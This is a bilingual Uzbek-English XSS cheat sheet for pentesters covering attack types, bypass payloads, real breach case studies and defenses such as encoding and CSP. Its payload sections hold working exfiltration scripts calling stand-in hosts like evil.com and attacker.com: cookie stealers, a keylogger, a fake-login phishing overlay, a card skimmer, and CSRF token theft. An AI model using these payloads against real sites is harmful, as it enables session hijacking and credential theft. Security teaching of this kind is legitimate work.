# 🛡️ XSS (Cross-Site Scripting) — To'liq Cheat Sheet

> **Complete bilingual XSS reference** | O'zbek va ingliz tilida | Pentester, bug bounty hunter va web developer uchun

![XSS](https://img.shields.io/badge/Security-XSS-red?style=for-the-badge)
![Level](https://img.shields.io/badge/Level-Beginner%20to%20Advanced-blue?style=for-the-badge)
![Lang](https://img.shields.io/badge/Language-UZ%20%7C%20EN-green?style=for-the-badge)

---

## 📋 Mundarija / Table of Contents

- [1. Kirish / Introduction](#1-kirish--introduction)
- [2. XSS Turlari / XSS Types](#2-xss-turlari--xss-types)
  - [2.1 Reflected XSS](#21-reflected-xss)
  - [2.2 Stored XSS](#22-stored-xss)
  - [2.3 DOM-based XSS](#23-dom-based-xss)
  - [2.4 Blind XSS](#24-blind-xss)
  - [2.5 Self XSS](#25-self-xss)
- [3. Payload Turlari / Payload Types](#3-payload-turlari--payload-types)
  - [3.1 Classic Payloadlar](#31-classic-payloadlar)
  - [3.2 Event Handler Payloadlar](#32-event-handler-payloadlar)
  - [3.3 Filter Bypass Payloadlar](#33-filter-bypass-payloadlar)
  - [3.4 Context-based Payloadlar](#34-context-based-payloadlar)
  - [3.5 Polyglot Payloadlar](#35-polyglot-payloadlar)
  - [3.6 WAF Bypass Payloadlar](#36-waf-bypass-payloadlar)
- [4. Hujum Stsenariylari / Attack Scenarios](#4-hujum-stsenariylari--attack-scenarios)
- [5. Real Dunyo Case Studylar](#5-real-dunyo-case-studylar)
- [6. Himoya / Defense](#6-himoya--defense)
- [7. Tools & Resurslar](#7-tools--resurslar)

---

## 1. Kirish / Introduction

### XSS nima? / **What is XSS?**

XSS — bu tajovuzkor zararli JavaScript kodini boshqa foydalanuvchilarning brauzerida ishlatishiga imkon beruvchi web zaiflikdir.

**XSS (Cross-Site Scripting) is a web vulnerability that allows an attacker to inject malicious JavaScript code into web pages viewed by other users.**

```
Tajovuzkor          Zaif veb-sayt         Jabrlanuvchi
(Attacker)    -->   (Vulnerable Site)  --> (Victim)
    |                     |                    |
    | Payload yuboradi     |                    |
    | (Sends payload)      |                    |
    |-------------------->|                    |
                          | Kod saqlanadi/      |
                          | aks ettiriladi      |
                          | (Code stored/       |
                          |  reflected)         |
                          |------------------->|
                                               |
                                    Brauzerda ishlaydi
                                    (Executes in browser)
                                    Cookie o'g'irlanadi
                                    (Cookies stolen)
```

### Qanday ishlaydi? / **How does it work?**

Brauzer HTML/JS ni bir manbadan kelgan yaxlit kod sifatida ishlaydi.

**The browser treats HTML and JavaScript as trusted code from the same origin. When an attacker injects script into a page, the browser executes it with the same privileges as the legitimate site.**

```
Normal holat:                    XSS holati:
─────────────                    ──────────
Server → HTML → Browser          Server → HTML + <script>evil()</script> → Browser
                ↓                                                           ↓
         Sahifa ko'rsatiladi                                    Zararli kod ishlaydi
         (Page rendered)                                        (Malicious code runs)
```

### Zaiflik sabablari / **Root Causes**

| Sabab | **Cause** | Misol |
|-------|-----------|-------|
| Input validatsiya yo'q | **No input validation** | `<script>` ni qabul qilish |
| Output encoding yo'q | **No output encoding** | `<` ni `&lt;` ga o'tkazmaslik |
| CSP konfiguratsiya xatosi | **Misconfigured CSP** | `unsafe-inline` ruxsati |
| Framework noto'g'ri ishlatish | **Improper framework usage** | `innerHTML` ishlatish |
| Eski kutubxonalar | **Outdated libraries** | jQuery 1.x zaif versiyalar |

---

## 2. XSS Turlari / XSS Types

### Arxitektura diagrammasi / **Architecture Diagram**

```
┌─────────────────────────────────────────────────────────┐
│                    XSS TURLARI                          │
│                    XSS TYPES                            │
├──────────────┬──────────────┬────────────┬─────────────┤
│  REFLECTED   │   STORED     │    DOM     │    BLIND    │
│   (Aks)      │  (Saqlangan) │  (Brauzer) │   (Ko'r)   │
├──────────────┼──────────────┼────────────┼─────────────┤
│  URL orqali  │  DB ga       │  JS orqali │  Kechikib  │
│  keladi      │  saqlanadi   │  ishlaydi  │  ishlaydi  │
├──────────────┼──────────────┼────────────┼─────────────┤
│  Server      │  Server      │  Server    │  Admin      │
│  javob       │  javob       │  javob     │  paneli     │
│  kerak       │  kerak       │  shart     │  yoki log  │
│              │              │  emas      │             │
└──────────────┴──────────────┴────────────┴─────────────┘
```

---

### 2.1 Reflected XSS

**Reflected XSS** — eng keng tarqalgan tur. Payload URL yoki forma orqali yuboriladi va server uni darhol javobda qaytaradi.

**Reflected XSS is the most common type. The payload is sent via URL or form and immediately reflected back in the server's response without being stored.**

#### Mantiq / **Logic Flow:**
```
1. Attacker crafts malicious URL
   https://site.com/search?q=<script>alert(1)</script>

2. Victim clicks the link (phishing, etc.)

3. Server reflects input into HTML response:
   <p>Search results for: <script>alert(1)</script></p>

4. Browser executes the script
   → Cookie stolen / Session hijacked
```

#### Zaif kod misoli / **Vulnerable Code Example:**
```php
<!-- ZAIF / VULNERABLE PHP -->
<?php
$search = $_GET['q'];
echo "<p>Natija: $search</p>";  // Hech qanday encoding yo'q!
?>

<!-- XAVFSIZ / SECURE PHP -->
<?php
$search = htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8');
echo "<p>Natija: $search</p>";
?>
```

#### Test Payloadlar / **Test Payloads:**
```html
<script>alert('Reflected XSS')</script>
<script>alert(document.cookie)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
```

---

### 2.2 Stored XSS

**Stored XSS** — eng xavfli tur. Payload ma'lumotlar bazasiga saqlanadi va sahifani ko'rgan barcha foydalanuvchilarga ta'sir qiladi.

**Stored XSS is the most dangerous type. The malicious payload is permanently stored in the database and affects every user who views the infected page.**

#### Mantiq / **Logic Flow:**
```
┌─────────────┐    Payload yuboradi     ┌─────────────┐
│             │ ──────────────────────> │             │
│  Attacker   │  POST /comment          │   Server    │
│             │  body=<script>...       │             │
└─────────────┘                         └──────┬──────┘
                                               │
                                         DB ga saqlaydi
                                         (Saves to DB)
                                               │
                                         ┌─────▼──────┐
                                         │  Database  │
                                         │ [evil code]│
                                         └─────┬──────┘
                                               │
                    ┌──────────────────────────┘
                    │ Sahifani ochganda
                    │ (When page loads)
               ┌────▼────┐
               │ Victim  │ ← Har bir tashrif buyuruvchi
               │ Browser │   (Every visitor affected)
               └─────────┘
```

#### Real Stsenariy / **Real Scenario:**
```
1. Blog saytida izoh (comment) qoldirish imkoniyati bor
2. Attacker shunday izoh yozadi:
   "Yaxshi maqola! <script>document.location='https://evil.com/steal?c='+document.cookie</script>"
3. Bu izoh DB ga saqlanadi
4. Sahifani ko'rgan har bir foydalanuvchining cookie'si o'g'irlanadi
```

#### Zaif kod / **Vulnerable Code:**
```javascript
// ZAIF / VULNERABLE Node.js
app.get('/comments', (req, res) => {
    const comments = db.getComments();
    res.send(`<div>${comments.join('<br>')}</div>`); // XSS!
});

// XAVFSIZ / SECURE
const escapeHtml = require('escape-html');
app.get('/comments', (req, res) => {
    const comments = db.getComments().map(c => escapeHtml(c));
    res.send(`<div>${comments.join('<br>')}</div>`);
});
```

---

### 2.3 DOM-based XSS

**DOM-based XSS** — payload serverga yetib bormaydi, to'liq brauzer tomonida JavaScript orqali ishlaydi.

**DOM-based XSS occurs entirely in the browser. The payload never reaches the server; instead, malicious JavaScript manipulates the DOM directly.**

#### Mantiq / **Logic Flow:**
```
URL: https://site.com/page#<img src=x onerror=alert(1)>
                              ↑
                         Fragment (#) serverga yuborilmaydi
                         (Fragment never sent to server)

JavaScript:
document.getElementById('output').innerHTML = location.hash.slice(1);
                                    ↑
                              Xavfli sink!
                              (Dangerous sink!)
```

#### Xavfli Source va Sink'lar / **Dangerous Sources & Sinks:**
```javascript
// XAVFLI SOURCES (Dangerous Sources):
location.href          // URL butunlay
location.hash          // # dan keyingi qism
location.search        // ? dan keyingi qism
document.referrer      // Oldingi URL
window.name            // Window nomi
localStorage / sessionStorage

// XAVFLI SINKS (Dangerous Sinks):
element.innerHTML      // ← ENG XAVFLI / MOST DANGEROUS
element.outerHTML
document.write()
document.writeln()
eval()
setTimeout("string")
setInterval("string")
element.src
element.href
```

#### Misol / **Example:**
```javascript
// ZAIF / VULNERABLE
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = `Salom, ${name}!`;
// URL: ?name=<img src=x onerror=alert(document.cookie)>

// XAVFSIZ / SECURE
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').textContent = `Salom, ${name}!`;
// textContent avtomatik escape qiladi / textContent auto-escapes
```

---

### 2.4 Blind XSS

**Blind XSS** — tajovuzkor o'z payloadining ishlashini darhol ko'rmaydi. Admin paneli, log tizimi yoki tiketing tizimida kechikib ishlaydi.

**In Blind XSS, the attacker cannot see the payload execute immediately. It fires later when an admin or staff member views the stored data in a backend system.**

#### Mantiq / **Logic Flow:**
```
Attacker                  Web App              Admin Panel
   │                         │                      │
   │  Zaif formaga           │                      │
   │  payload yuboradi ──────►│                      │
   │  (Sends payload to      │  DB ga saqlaydi       │
   │   contact form)         │──────────────────────►│
   │                         │                      │
   │                         │             Admin ochganda
   │                         │             (When admin opens)
   │◄────────────────────────────────────────────────│
   │  OOB so'rov keladi                              │
   │  (Out-of-band callback)                         │
   │  https://attacker.com/xss?cookie=ADMIN_COOKIE   │
```

#### Blind XSS Payloadi / **Blind XSS Payload:**
```javascript
// XSS Hunter yoki o'z serveringizga / XSS Hunter or your own server
"><script src="https://your-server.com/xss.js"></script>

// xss.js fayli mazmuни / xss.js file contents:
new Image().src = "https://your-server.com/collect?" +
    "cookie=" + encodeURIComponent(document.cookie) +
    "&url=" + encodeURIComponent(location.href) +
    "&ua=" + encodeURIComponent(navigator.userAgent);
```

#### Ishlatish sohalari / **Common Targets:**
```
✓ Support/Helpdesk tizimlari     → Xabar matni
✓ Feedback formalar              → Fikr matni
✓ Log viewers                    → User-Agent, Referer
✓ Admin panellar                 → Foydalanuvchi ma'lumotlari
✓ Error monitoring               → Error xabarlari
✓ CRM tizimlari                  → Mijoz ma'lumotlari
```

---

### 2.5 Self XSS

**Self XSS** — foydalanuvchi o'zini aldab o'z brauzerida ishlatadigan XSS. Odatda "DevTools'ga nusxa ko'chiring" sxemasida ishlatiladi.

**Self XSS is a social engineering attack where the victim is tricked into executing malicious code in their own browser, typically via the browser console.**

```
Attacker: "Maxsus kodni konsol (F12)ga nusxa ko'chiring va ENTER bosing!"
Victim: [F12 bosadi, zararli kodni nusxa ko'chiradi, ENTER bosadi]
Result: Attacker'ga cookie, token yoki boshqa ma'lumotlar yuboriladi
```

---

## 3. Payload Turlari / Payload Types

### 3.1 Classic Payloadlar

**Classic payloads use the basic `<script>` tag and are detected by most modern filters.**

```html
<!-- Asosiy / Basic -->
<script>alert(1)</script>
<script>alert('XSS')</script>
<script>alert(document.domain)</script>

<!-- Cookie o'g'irlash / Cookie Stealing -->
<script>document.location='http://evil.com/?c='+document.cookie</script>
<script>new Image().src='http://evil.com/steal?c='+document.cookie</script>
<script>fetch('http://evil.com/steal?c='+document.cookie)</script>

<!-- XMLHttpRequest bilan / With XMLHttpRequest -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://evil.com/steal?c=' + document.cookie);
xhr.send();
</script>
```

---

### 3.2 Event Handler Payloadlar

**Event handlers execute JavaScript when specific browser events occur — no `<script>` tag needed.**

```html
<!-- onerror — rasm yuklanmaganda / image load error -->
<img src=x onerror=alert(1)>
<img src=x onerror="alert(document.cookie)">
<img src="https://broken.url" onerror=this.src='http://evil.com/?c='+document.cookie>

<!-- onload — element yuklanganda / element loaded -->
<body onload=alert(1)>
<svg onload=alert(1)>
<iframe onload=alert(1)>

<!-- onfocus / onblur -->
<input onfocus=alert(1) autofocus>
<input onblur=alert(1)>

<!-- onmouseover / onclick -->
<a href="#" onmouseover=alert(1)>Sichqonchani olib keling</a>
<button onclick=alert(1)>Bosing</button>
<div onmouseover="alert('XSS')">Hover here</div>

<!-- onkeypress / onkeydown -->
<input onkeypress=alert(1)>
<input onkeydown="alert(document.cookie)">

<!-- ontoggle (HTML5) -->
<details ontoggle=alert(1) open>

<!-- oninput / onpaste -->
<input oninput=alert(1)>
<input onpaste=alert(1)>
```

---

### 3.3 Filter Bypass Payloadlar

**Filter bypass payloads use various encoding, obfuscation, and parser tricks to evade security filters.**

#### Katta-kichik harf / **Case Manipulation:**
```html
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x OnErRoR=alert(1)>
```

#### HTML Encoding / **HTML Entity Encoding:**
```html
<!-- Hex encoding -->
<img src=x onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">

<!-- Decimal encoding -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">

<!-- Named entities -->
<a href="javascript:alert&lpar;1&rpar;">Click</a>
```

#### JavaScript Encoding / **JS String Obfuscation:**
```javascript
// Unicode escape
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>

// Hex escape
<script>\x61\x6c\x65\x72\x74(1)</script>

// eval bilan / with eval
<script>eval('ale'+'rt(1)')</script>
<script>eval(atob('YWxlcnQoMSk='))</script>  // base64

// setTimeout/setInterval
<script>setTimeout('alert(1)',0)</script>
<script>setInterval('alert(1)',9999)</script>

// Function constructor
<script>new Function('alert(1)')()</script>
<script>[].constructor.constructor('alert(1)')()</script>
```

#### Tag Fragmentatsiyasi / **Tag Breaking:**
```html
<!-- Broken tags -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- Tab va newline bilan / With tab and newline -->
<img src="x"    onerror="alert(1)">
<img src="x" onerror
=alert(1)>
```

#### URL Encoding / **URL Encoding:**
```
%3Cscript%3Ealert(1)%3C/script%3E
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E

# Double URL encoding
%253Cscript%253Ealert(1)%253C/script%253E
```

#### Muqobil Teglar / **Alternative Tags:**
```html
<!-- Script tegisiz / Without <script> -->
<svg><script>alert(1)</script></svg>
<math><mtext></mtext><script>alert(1)</script></math>

<!-- SVG animatsiya / SVG animation -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set attributeName=x onbegin=alert(1)>

<!-- Object/Embed -->
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
```

---

### 3.4 Context-based Payloadlar

**The correct payload depends entirely on where your input is reflected in the HTML.**

#### HTML Konteksti / **HTML Context:**
```html
<!-- Input: <h1>SIZNING_INPUT</h1> -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

#### Attribute Konteksti / **Attribute Context:**
```html
<!-- Input: <input value="SIZNING_INPUT"> -->
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
" onmouseover=alert(1) x="

<!-- Single quote attribute -->
<!-- <input value='SIZNING_INPUT'> -->
' onmouseover='alert(1)
' onfocus='alert(1)' autofocus='
```

#### JavaScript Konteksti / **JavaScript Context:**
```javascript
// Input: var name = "SIZNING_INPUT";
";alert(1)//
";alert(1);"
\";alert(1)//

// Input: var name = 'SIZNING_INPUT';
';alert(1)//
';alert(1);'
\';alert(1)//

// Input: var id = SIZNING_INPUT;
1;alert(1)
1-alert(1)-1
```

#### URL Konteksti / **URL Context:**
```html
<!-- Input: <a href="SIZNING_INPUT">Click</a> -->
javascript:alert(1)
javascript:alert(document.cookie)
JaVaScRiPt:alert(1)
&#106;avascript:alert(1)
java&#9;script:alert(1)    <!-- Tab bilan / with tab -->
java&#10;script:alert(1)   <!-- Newline bilan / with newline -->

<!-- Input: <img src="SIZNING_INPUT"> -->
x" onerror="alert(1)
```

#### CSS Konteksti / **CSS Context:**
```html
<!-- Input: <div style="SIZNING_INPUT"> -->
color:red;background:url(javascript:alert(1))
</style><script>alert(1)</script>
```

---

### 3.5 Polyglot Payloadlar

**Polyglot payloads work across multiple contexts simultaneously — HTML, attributes, JavaScript, and URLs.**

```html
<!-- Universal polyglot -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

<!-- Qisqaroq polyglot / Shorter polyglot -->
">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>

<!-- Attribute + HTML polyglot -->
" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//

<!-- String encoded -->
'">><script>alert(String.fromCharCode(88,83,83))</script>
```

---

### 3.6 WAF Bypass Payloadlar

**WAF (Web Application Firewall) bypass payloads use advanced obfuscation to evade commercial security filters like ModSecurity, Cloudflare, and AWS WAF.**

```html
<!-- Cloudflare bypass -->
<svg/onload=alert`1`>
<svg onload=alert(1)//
<svg/onload=self[`al`+`ert`]`1`>

<!-- ModSecurity bypass -->
<scr\x00ipt>alert(1)</scr\x00ipt>
<scr\x09ipt>alert(1)</scr\x09ipt>

<!-- Template literals (backtick) -->
<script>alert`1`</script>
<img src=x onerror=alert`1`>

<!-- Constructor chain -->
<script>[][`fill`][`constructor`](`alert(1)`)();</script>

<!-- window[] bracket notation -->
<script>window[`al`+`ert`](1)</script>
<script>this[`al`+`ert`](1)</script>

<!-- Prototype chain -->
<script>({}).constructor.constructor('alert(1)')()</script>

<!-- Double encoding bypass -->
%2522%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E
```

---

## 4. Hujum Stsenariylari / Attack Scenarios

### 4.1 Session Hijacking (Cookie O'g'irlash)

**Session hijacking steals the victim's session cookie, allowing the attacker to impersonate them.**

```javascript
// 1-usul: Image src orqali / Via Image src
<script>
new Image().src = "https://attacker.com/steal?cookie=" +
    encodeURIComponent(document.cookie);
</script>

// 2-usul: Fetch API
<script>
fetch('https://attacker.com/steal?' + new URLSearchParams({
    c: document.cookie,
    u: location.href
}));
</script>

// 3-usul: XMLHttpRequest
<script>
var req = new XMLHttpRequest();
req.open('POST', 'https://attacker.com/steal', true);
req.send(JSON.stringify({
    cookie: document.cookie,
    url: document.location.href,
    localStorage: JSON.stringify(localStorage)
}));
</script>
```

```
Hujum oqimi / Attack Flow:
─────────────────────────
Victim Browser  →  [XSS Payload ishlaydi / fires]
                →  Cookie: session_id=abc123
                →  HTTP GET https://attacker.com/steal?cookie=session_id=abc123

Attacker Server →  Log: 2024-01-01 GET /steal?cookie=session_id=abc123
                →  Browser ochadi / opens browser
                →  Cookie: session_id=abc123 set qiladi
                →  Admin sahifasiga kiradi ✓
```

---

### 4.2 Keylogger

**XSS-based keyloggers capture everything the victim types on the page.**

```javascript
<script>
document.addEventListener('keypress', function(e) {
    new Image().src = "https://attacker.com/keys?k=" +
        encodeURIComponent(e.key) + "&t=" + Date.now();
});
</script>

// Kengaytirilgan versiya / Advanced version
<script>
var keys = [];
document.addEventListener('keydown', function(e) {
    keys.push({
        key: e.key,
        target: e.target.name || e.target.id || e.target.type,
        time: Date.now()
    });
    if(keys.length > 20) {
        fetch('https://attacker.com/keys', {
            method: 'POST',
            body: JSON.stringify(keys)
        });
        keys = [];
    }
});
</script>
```

---

### 4.3 Phishing (Sahifa Almashtirish)

**XSS-based phishing replaces the legitimate page with a fake login form.**

```javascript
<script>
document.body.innerHTML = `
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:99999">
    <div style="max-width:400px;margin:100px auto;font-family:Arial">
        <h2>Sessiya muddati tugadi. Qayta kiring.</h2>
        <p>Session expired. Please log in again.</p>
        <input id="u" type="email" placeholder="Email"
               style="width:100%;padding:10px;margin:5px 0">
        <input id="p" type="password" placeholder="Parol"
               style="width:100%;padding:10px;margin:5px 0">
        <button onclick="steal()"
                style="width:100%;padding:10px;background:#0066cc;color:white;border:none">
            Kirish / Login
        </button>
    </div>
</div>
<script>
function steal() {
    fetch('https://attacker.com/phish', {
        method: 'POST',
        body: JSON.stringify({
            email: document.getElementById('u').value,
            password: document.getElementById('p').value,
            site: location.href
        })
    });
    location.reload();
}
<\/script>`;
</script>
```

---

### 4.4 CSRF + XSS Kombinatsiyasi

**XSS defeats CSRF protections because the attacker's script runs in the victim's origin and can read CSRF tokens.**

```javascript
<script>
// 1. CSRF tokenni o'qish / Read CSRF token
fetch('/account/settings')
.then(r => r.text())
.then(html => {
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');
    const token = doc.querySelector('[name=csrf_token]').value;

    // 2. Token bilan so'rov yuborish / Send request with token
    return fetch('/account/change-email', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: `email=attacker@evil.com&csrf_token=${token}`
    });
})
.then(() => {
    // Email o'zgartirildi! / Email changed!
    new Image().src = 'https://attacker.com/done';
});
</script>
```

---

## 5. Real Dunyo Case Studylar

### Case Study 1: TweetDeck XSS (2014)

**Tarqalish mexanizmi / Spread mechanism:**

```
Timeline:
──────────────────────────────────────────────────────
11:44 — @derGeruhn birinchi payloadni tweet qildi
        (tweeted first payload)
        Tweet: <script class="xss">...</script>♥

11:45 — TweetDeck auto-retweet funksiyasi bilan
        payload viral tarqaldi (viral spread via auto-RT)

11:46 — 100,000+ hisob ta'sirlandi (100K+ accounts affected)

11:48 — Twitter TweetDeck ni o'chirdi (Twitter shut it down)
──────────────────────────────────────────────────────
```

**Texnik tahlil / Technical Analysis:**
```javascript
// Zaif kod (taxminiy) / Vulnerable code (approximate)
// TweetDeck tweet matnini innerHTML orqali render qilgan
tweetElement.innerHTML = tweetText; // ← DOM XSS!

// Payload (soddalashtirилgan / simplified):
// <script class="xss">
// $(".xss").parents().eq(1).find("a").eq(1).click(); // Auto-retweet
// </script>
```

**Ta'sir / Impact:** TweetDeck to'xtatildi, millionlab foydalanuvchi ta'sirlandi.

---

### Case Study 2: British Airways (2018) — Magecart

**Bu Stored XSS + Supply Chain hujumi kombinatsiyasi / Stored XSS + Supply Chain attack:**

```
Hujum bosqichlari / Attack Stages:
───────────────────────────────────────────────────────
[1] Attacker BA ning web serveriga kirdi
    (Attacker gained access to BA's web server)

[2] Uchinchi tomon JavaScript fayliga zararli skript qo'shdi
    (Injected malicious script into third-party JS library)

[3] Skript checkout sahifasidagi barcha form maydonlarni kuzatdi
    (Script monitored all form fields on the checkout page)

[4] Karta ma'lumotlari avtomatik yig'ilib tashqi serverga yuborildi
    (Card data was automatically collected and exfiltrated)

[5] 2 hafta davomida ~500,000 mijoz ta'sirlandi
    (For 2 weeks, ~500K customers were affected)
───────────────────────────────────────────────────────
```

**Injeksiya qilingan kod (soddalashtirилган) / Injected code (simplified):**
```javascript
(function() {
    if (location.pathname.includes('/checkout')) {
        document.addEventListener('submit', function(e) {
            var data = {
                name:  document.querySelector('[name=name]').value,
                card:  document.querySelector('[name=card]').value,
                cvv:   document.querySelector('[name=cvv]').value,
                exp:   document.querySelector('[name=exp]').value,
                url:   location.href
            };
            new Image().src = 'https://baways.com/?' + btoa(JSON.stringify(data));
        });
    }
})();
```

**Jarima / Fine:** £183 million (GDPR).

---

### Case Study 3: Samy Worm — MySpace (2005)

**Tarihdagi birinchi XSS wormi / The first self-propagating XSS worm in history.**

```
Tarqalish statistikasi / Spread statistics:
───────────────────────────────────
Boshlanish:     2005-yil 4-oktabr, soat 13:00
1 soatdan keyin:  tens of thousands of profiles
10 soatda:      1,000,000 do'st qo'shdi
Natija:         MySpace to'xtatildi
Yakunlanish:    Samy Kamkar 3 yil probatsiya oldi
───────────────────────────────────
```

**Mexanizm / Mechanism:**
```javascript
// 1. Worm CSS-da yashiringan edi (MySpace CSS ruxsat bergan)
//    Worm was hidden inside CSS (MySpace allowed CSS injection)

// 2. Sahifa ochilganda worm ishladi
//    Worm executed when profile page loaded

// 3. Jabrlanuvchining profiliga o'zini nusxaladi
//    Copied itself to the victim's profile

// 4. "Samy is my hero" matni qo'shildi
//    Added "Samy is my hero" to every infected profile

// Soddalashtirилган mantiq / Simplified logic:
// a) AJAX orqali CSRF token o'qildi
// b) Samy do'st sifatida qo'shildi
// c) Worm kodi jabrlanuvchi profiliga yozildi
// d) Sahifani ko'rgan har bir kishi yuqtirdi
```

**Ta'sir / Impact:** 1 million profil 10 soatda yuqtirildi — internet tarixidagi eng tez tarqalgan XSS.

---

## 6. Himoya / Defense

### 6.1 Input Validation

**Always validate and sanitize all user input on the server side.**

```python
# Python - bleach kutubxonasi / bleach library
import bleach

# Faqat ruxsat etilgan teglar / Only allowed tags
allowed_tags = ['b', 'i', 'u', 'p', 'br']
clean_html = bleach.clean(user_input, tags=allowed_tags, strip=True)

# Hech qanday HTML ruxsati yo'q / No HTML allowed
clean_text = bleach.clean(user_input, tags=[], strip=True)
```

```javascript
// JavaScript - DOMPurify (eng yaxshi / best option)
import DOMPurify from 'dompurify';

const clean = DOMPurify.sanitize(user_input);
document.getElementById('output').innerHTML = clean;

// Faqat matn uchun / For text only
document.getElementById('output').textContent = user_input;
```

---

### 6.2 Output Encoding

**Encode output based on the context where it will be rendered.**

```javascript
// Kontekstga qarab encoding / Context-aware encoding

// HTML konteksti / HTML context
function htmlEncode(str) {
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');
}

// JavaScript konteksti / JS context
function jsEncode(str) {
    return str.replace(/[^\w]/g, c =>
        '\\u' + ('0000' + c.charCodeAt(0).toString(16)).slice(-4)
    );
}

// URL konteksti / URL context
function urlEncode(str) {
    return encodeURIComponent(str);
}
```

---

### 6.3 Content Security Policy (CSP)

**CSP is a browser security mechanism that restricts which resources can be loaded.**

```http
# Eng qat'iy CSP / Strictest CSP
Content-Security-Policy:
    default-src 'none';
    script-src 'nonce-{RANDOM_NONCE}' 'strict-dynamic';
    style-src 'self' 'nonce-{RANDOM_NONCE}';
    img-src 'self' data:;
    font-src 'self';
    connect-src 'self';
    frame-ancestors 'none';
    base-uri 'none';
    form-action 'self';

# Oddiy CSP / Simple CSP
Content-Security-Policy: script-src 'self'; object-src 'none'
```

```html
<!-- Nonce bilan / With nonce -->
<meta http-equiv="Content-Security-Policy"
      content="script-src 'nonce-abc123'">

<!-- Faqat bu skript ishlaydi / Only this script runs -->
<script nonce="abc123">alert('ruxsat etilgan')</script>

<!-- Bu bloklanadi / This is blocked -->
<script>alert('bloklanadi')</script>
```

---

### 6.4 HTTPOnly va Secure Cookie

**HTTPOnly prevents JavaScript from accessing cookies; Secure ensures cookies are only sent over HTTPS.**

```python
# Python Flask
response.set_cookie('session_id', value,
    httponly=True,    # JavaScript o'qiy olmaydi / JS cannot read
    secure=True,      # Faqat HTTPS / Only HTTPS
    samesite='Strict' # CSRF himoyasi / CSRF protection
)
```

```
Cookie Header:
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict

XSS hujumida / During XSS attack:
document.cookie  →  ""  (bo'sh! HttpOnly tufayli)
                         (empty! because of HttpOnly)
```

---

### 6.5 Framework Himoyasi

**Modern frameworks provide built-in XSS protection through automatic output escaping.**

```jsx
// React — avtomatik escape / automatic escaping
const userInput = "<script>alert(1)</script>";

// XAVFSIZ — React avtomatik escape qiladi / SAFE — auto-escaped
const SafeComponent = () => <div>{userInput}</div>;
// Output: <div>&lt;script&gt;alert(1)&lt;/script&gt;</div>

// XAVFLI — dangerouslySetInnerHTML ishlatmang! / DANGEROUS!
const DangerousComponent = () => (
    <div dangerouslySetInnerHTML={{__html: userInput}} />
);
```

```python
# Django — avtomatik escape / automatic escaping
# Template:
{{ user_input }}          # ✅ Xavfsiz — avtomatik escape
{{ user_input|safe }}     # ❌ Xavfli — escape o'chirilgan
{% autoescape off %}...{% endautoescape %}  # ❌ XAVFLI
```

---

### 6.6 Himoya Darajalari Jadvali / **Defense Summary Table**

| Himoya qatlami / **Defense Layer** | Muhimlik / **Importance** | Eslatma / **Note** |
|---|---|---|
| Output Encoding | ⭐⭐⭐⭐⭐ | Eng muhim / Most critical |
| Input Validation | ⭐⭐⭐⭐⭐ | Server-side majburiy / Server-side mandatory |
| CSP Header | ⭐⭐⭐⭐⭐ | Defence-in-depth |
| HTTPOnly Cookie | ⭐⭐⭐⭐ | Cookie himoyasi / Cookie protection |
| Framework Auto-escape | ⭐⭐⭐⭐ | Avtomatik / Automatic |
| WAF | ⭐⭐⭐ | Qo'shimcha qatlam / Extra layer |
| X-XSS-Protection | ⭐⭐ | Eski brauzerlar / Legacy browsers |

---

## 7. Tools & Resurslar

### Avtomatik Skanerlar / **Automated Scanners**

| Tool | Buyruq / **Command** | Tavsif / **Description** |
|------|----------------------|--------------------------|
| **XSStrike** | `python3 xsstrike.py -u "https://target.com/search?q=test"` | **Advanced XSS scanner with fuzzing** |
| **Dalfox** | `dalfox url "https://target.com/search?q=test"` | **Fast Go-based parameter scanner** |
| **XSSer** | `xsser -u "https://target.com" -g "/search?q=XSS"` | **Automated XSS fuzzer** |
| **Burp Suite** | GUI orqali / via GUI | **Industry standard web scanner** |

### O'rnatish va Ishlatish / **Installation & Usage:**
```bash
# XSStrike
git clone https://github.com/s0md3v/XSStrike
cd XSStrike && pip3 install -r requirements.txt
python3 xsstrike.py -u "http://target.com/page?param=test"

# Dalfox
go install github.com/hahwul/dalfox/v2@latest
dalfox url "http://target.com/page?param=test"
dalfox url "http://target.com/page?param=test" --output results.txt

# Pipeline (httpx + dalfox)
cat urls.txt | httpx -silent | dalfox pipe
```

### Browser Extensions

```
✓ HackBar         — Payload yuborish  / Payload sending
✓ Cookie Editor   — Cookie boshqarish / Cookie management
✓ Wappalyzer      — Texnologiyani aniqlash / Technology detection
✓ FoxyProxy       — Burp Suite integratsiyasi / Burp integration
```

### Online Practice Platformalar / **Practice Platforms**

```
🎯 XSS Game (Google)      — https://xss-game.appspot.com
🎯 PortSwigger Web Academy — https://portswigger.net/web-security/cross-site-scripting
🎯 DVWA                   — http://www.dvwa.co.uk
🎯 HackTheBox             — https://hackthebox.com
